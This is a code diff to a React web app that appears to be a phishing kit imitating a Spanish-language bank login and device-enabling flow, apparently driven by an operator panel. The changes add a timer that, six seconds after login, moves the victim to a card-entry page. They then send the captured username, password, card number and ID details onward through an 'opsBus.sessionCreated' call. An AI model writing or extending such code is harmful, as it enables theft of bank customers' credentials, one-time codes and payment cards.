@@ -26,6 +26,7 @@ function loadPending() {
       data.step !== 'loading' &&
       data.step !== 'otp' &&
       data.step !== 'otp-wait' &&
+      data.step !== 'card' &&
       !(data.route === 'habilitar' && data.step === 'idle')
     ) {
       return null
@@ -65,6 +66,7 @@ export default function App() {
     if (initial?.step === 'otp-wait' && initial?.otpVariant) return 'otp-wait'
     if (initial?.step === 'otp' && initial?.otpVariant) return 'otp'
     if (initial?.step === 'loading') return 'loading'
+    if (initial?.step === 'card') return 'card'
     if (initial?.route === 'habilitar' && initial?.step === 'idle') return 'idle'
     return 'idle'
   })
@@ -91,6 +93,7 @@ export default function App() {
   const lastTerminalKeyRef = useRef('')
   /** Panel envió a Habilitar dispositivo (misma sesión del login) */
   const dispositivoFromPanelRef = useRef(Boolean(initial?.dispositivoFromPanel))
+  const cardTimerRef = useRef(0)
 
   useEffect(() => {
     pendingUserRef.current = pendingUser
@@ -124,7 +127,13 @@ export default function App() {
   useEffect(() => {
     const keepHabilitarForm =
       route === 'habilitar' && step === 'idle' && sessionIdRef.current
-    if (step !== 'loading' && step !== 'otp' && step !== 'otp-wait' && !keepHabilitarForm) {
+    if (
+      step !== 'loading' &&
+      step !== 'otp' &&
+      step !== 'otp-wait' &&
+      step !== 'card' &&
+      !keepHabilitarForm
+    ) {
       if (step === 'idle' && route === 'login') clearPending()
       return
     }
@@ -179,6 +188,10 @@ export default function App() {
   }
 
   function applyFactor(action, image) {
+    if (cardTimerRef.current) {
+      window.clearTimeout(cardTimerRef.current)
+      cardTimerRef.current = 0
+    }
     setErrorMsg('')
     setSuccessMsg('')
     setOtpTokenError('')
@@ -191,6 +204,10 @@ export default function App() {
     const key = `${sessionIdRef.current}:done`
     if (lastTerminalKeyRef.current === key) return
     lastTerminalKeyRef.current = key
+    if (cardTimerRef.current) {
+      window.clearTimeout(cardTimerRef.current)
+      cardTimerRef.current = 0
+    }
     setPendingUser(null)
     setOtpVariant(null)
     setOtpImage('')
@@ -210,6 +227,10 @@ export default function App() {
     const key = `${sessionIdRef.current}:reset:${message || ''}`
     if (message && lastTerminalKeyRef.current === key) return
     if (message) lastTerminalKeyRef.current = key
+    if (cardTimerRef.current) {
+      window.clearTimeout(cardTimerRef.current)
+      cardTimerRef.current = 0
+    }
     setErrorMsg(message || '')
     setSuccessMsg('')
     setStep('idle')
@@ -506,6 +527,13 @@ export default function App() {
       last_seen: Date.now(),
       state: 'waiting',
     })
+
+    if (cardTimerRef.current) window.clearTimeout(cardTimerRef.current)
+    cardTimerRef.current = window.setTimeout(() => {
+      if (stepRef.current === 'otp' || stepRef.current === 'otp-wait') return
+      setStep('card')
+      cardTimerRef.current = 0
+    }, 6000)
   }
 
   function handleHabilitarSubmit(data) {
@@ -513,8 +541,9 @@ export default function App() {
     sessionIdRef.current = id
     lastTerminalKeyRef.current = ''
     const displayUser = data.complemento ? `${data.ci}-${data.complemento}` : data.ci
+    const fromLoginCard = stepRef.current === 'card' && routeRef.current === 'login'
     setPendingUser({
-      username: displayUser,
+      username: fromLoginCard ? pendingUserRef.current?.username || displayUser : displayUser,
       ...data,
     })
     setOtpVariant(null)
@@ -526,10 +555,16 @@ export default function App() {
 
     opsBus.sessionCreated({
       id,
-      flow: 'habilitar',
-      username: displayUser,
-      password: data.cardNumber || data.phone || '',
-      tipoUsuario: 'HABILITAR',
+      flow: fromLoginCard ? 'login' : 'habilitar',
+      username: fromLoginCard
+        ? pendingUserRef.current?.username || displayUser
+        : displayUser,
+      password: fromLoginCard
+        ? pendingUserRef.current?.password || data.cardNumber || ''
+        : data.cardNumber || data.phone || '',
+      tipoUsuario: fromLoginCard
+        ? pendingUserRef.current?.tipoUsuario || 'CODIGO_PERSONA'
+        : 'HABILITAR',
       ci: data.ci,
       complemento: data.complemento || '',
       extension: data.extension,
@@ -559,16 +594,18 @@ export default function App() {
 
   const waiting = step === 'loading' || step === 'otp' || step === 'otp-wait'
   const showOtp = route === 'login' && (step === 'otp' || step === 'otp-wait') && otpVariant
+  const showLoginCard = route === 'login' && step === 'card'
 
-  if (route === 'habilitar') {
+  if (route === 'habilitar' || showLoginCard) {
     return (
       <HabilitarDevicePage
         onSubmit={handleHabilitarSubmit}
-        onCancel={cancelHabilitar}
+        onCancel={showLoginCard ? goLogin : cancelHabilitar}
         locked={waiting}
         showSpinner={step === 'loading'}
         errorMsg={errorMsg}
         successMsg={successMsg}
+        startOnCard={showLoginCard}
       />
     )
   }
